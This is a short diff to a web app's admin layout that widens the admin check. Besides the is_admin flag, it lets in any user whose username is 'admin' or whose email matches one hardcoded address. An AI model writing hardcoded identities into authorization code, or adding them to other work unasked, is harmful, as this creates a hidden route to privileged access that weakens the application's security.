@@ -14,7 +14,10 @@ export default async function AdminLayout({ children }: { children: React.ReactN
     .eq('id', user.id)
     .single()
 
-  if (!profile?.is_admin && profile?.username !== 'admin') redirect('/')
+  const isAdmin = profile?.is_admin
+    || profile?.username === 'admin'
+    || user.email === 'yoopromise@nate.com'
+  if (!isAdmin) redirect('/')
 
   return (
     <div className="flex h-screen overflow-hidden bg-[#F7F7F5]">
